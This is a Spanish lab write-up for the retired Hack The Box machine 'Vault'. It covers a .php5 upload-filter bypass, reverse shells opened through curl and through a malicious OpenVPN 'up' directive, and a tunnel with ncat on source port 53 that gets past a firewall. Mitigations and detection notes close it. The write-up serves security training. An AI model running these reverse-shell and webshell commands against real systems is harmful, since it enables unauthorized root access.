---
machine: Vault
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
pwned: null
tags: [linux, web, upload, pivot, openvpn, qemu, spice, firewall, gpg]
---

# Vault — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired (30/03/2019). Ficha de referencia; no jugada en este perfil.
> Sin flags, credenciales ni claves reales.

## TL;DR

Un upload de imágenes acepta extensiones alternativas (`.php5`) y da una shell como `www-data`. En el escritorio de `dave` hay credenciales de SSH y una lista de hosts internos. Desde `ubuntu` se llega a la VM `DNS + Configurator`; su panel de VPN ejecuta un binario de OpenVPN con un fichero subido, y la directiva `up` permite ejecutar comandos como root. La VM `Vault` está detrás de un firewall que solo deja pasar origen/destino 53 y 4444; se usa `ncat` con puerto origen 53 para atravesarlo. La flag de root está cifrada con GPG y se descifra en otra VM.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 22,80 <TARGET_IP>
```

| Puerto | Servicio | Observación |
|---|---|---|
| 22/tcp | SSH | Acceso como `dave` |
| 80/tcp | HTTP | Aplicación `sparklays` con upload |

```bash
feroxbuster -u http://<TARGET_IP>/sparklays/ -x php,html
```

## Foothold

### 1. Saltar el filtro de extensión

`/sparklays/design/changelogo.php` sube imágenes a `/sparklays/design/uploads/`. Un `.php` se rechaza, pero el filtro es por extensión. Se prueba una lista de extensiones alternativas y `.php5` se acepta y se ejecuta.

```bash
cp shell.php shell.php5
curl -s -F 'file=@shell.php5' http://<TARGET_IP>/sparklays/design/changelogo.php
curl -s 'http://<TARGET_IP>/sparklays/design/uploads/shell.php5?cmd=id'
```

### 2. Shell interactiva

```bash
curl -s 'http://<TARGET_IP>/sparklays/design/uploads/shell.php5?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%20<LHOST>%20443%20%3E/tmp/f'
```

## Movimiento lateral

En `/home/dave/Desktop` hay tres ficheros: una lista de servidores internos, una clave y credenciales de SSH.

```bash
cat Servers
cat ssh
su dave
```

La lista identifica `192.168.122.4` (DNS + Configurator), `192.168.122.5` (Firewall) y `Vault`. Se accede por SSH como `dave` y se enumera la red interna.

```bash
ssh dave@<TARGET_IP>
for i in $(seq 1 254); do ping -c1 -W1 192.168.122.$i | grep -q 'bytes from' && echo $i; done
```

## Shell en DNS como root

### 1. Panel de VPN

Se crea un túnel SSH para ver el panel:

```bash
ssh -L 8080:192.168.122.4:80 dave@<TARGET_IP>
```

`http://localhost:8080/vpnconfig.php` permite subir una configuración y probarla con `?function=testvpn`. OpenVPN ejecuta las directivas del fichero; `up` se lanza tras establecer el túnel.

### 2. Configuración maliciosa

```text
remote 192.168.122.1
ifconfig 10.200.0.2 10.200.0.1
dev tun
script-security 2
up "/bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.122.1 8181 >/tmp/f'"
nobind
```

Se escucha en `8181` desde la sesión SSH, se sube el fichero y se pulsa **Test VPN**. La conexión llega desde `192.168.122.4` y la shell es `root`.

```bash
nc -lnvp 8181
```

## Shell en Vault

### 1. Entender el firewall

La VM `Vault` solo es alcanzable en el puerto 987. El firewall permite tráfico con origen o destino 53 y 4444. Un escaneo normal no ve nada; hay que fijar el puerto origen.

```bash
nmap -sT -p 987 --source-port 53 192.168.5.2
```

### 2. Túnel con puerto origen 53

Desde `DNS` como root:

```bash
ncat -l 1234 --sh-exec "ncat 192.168.5.2 987 -p 53" &
ssh dave@localhost -p 1234 -t bash
```

`-t bash` evita el `rbash` de la cuenta. Ya se está en `Vault` como `dave`.

## Root / flag cifrada

`/home/dave/root.txt.gpg` está cifrado con una clave que no está en `Vault`. Se transfiere el fichero a otra VM del laboratorio, donde está la clave privada, y se descifra:

```bash
base32 root.txt.gpg > root.b32
# transferir y decodificar en la otra VM
gpg -d root.txt.gpg
```

No se publica la frase de paso ni la clave. En esta máquina la escalada no es un `root` shell local: el objetivo es obtener la flag descifrada.

## Evidencia

- Upload de `shell.php5` y ejecución de `id`.
- `Servers` y credenciales de `dave` (redactadas).
- Panel `vpnconfig.php` y conexión de OpenVPN.
- `ncat` con `-p 53` y shell en `vault`.
- `gpg -d` sobre `root.txt.gpg`.

## Lecciones aprendidas

- Los filtros por extensión se saltan con extensiones que el servidor sigue interpretando.
- Un panel que ejecuta OpenVPN con un fichero de usuario es RCE como root si `script-security 2` está permitido.
- Un firewall con reglas por puerto origen no es un aislamiento: hay que fijar el origen.
- El movimiento lateral entre VMs es parte del diseño; no todo está en el host inicial.
- Una flag cifrada puede requerir volver a otra máquina, no una escalada local.

## Mitigaciones y detección

- Allowlist de extensiones y validación del contenido real con `finfo`; servir uploads desde un directorio sin ejecución.
- No permitir `script-security 2` ni directivas `up`/`down` en configuraciones de usuario.
- Segmentar la red con reglas por identidad, no solo por puerto; monitorizar tráfico con origen 53 hacia hosts que no son DNS.
- Detección: procesos `openvpn` con configuraciones temporales, conexiones salientes desde el panel, `ncat`/`ssh` desde el host DNS y lecturas de `root.txt.gpg`.

MITRE: T1190, T1059.004, T1572, T1562.004, T1552.

## Referencias

- <https://0xdf.gitlab.io/2019/04/06/htb-vault.html>
- <https://www.bleepingcomputer.com/news/security/downloading-3rd-party-openvpn-configs-may-be-dangerous-heres-why/>
- <https://man7.org/linux/man-pages/man1/ncat.1.html>
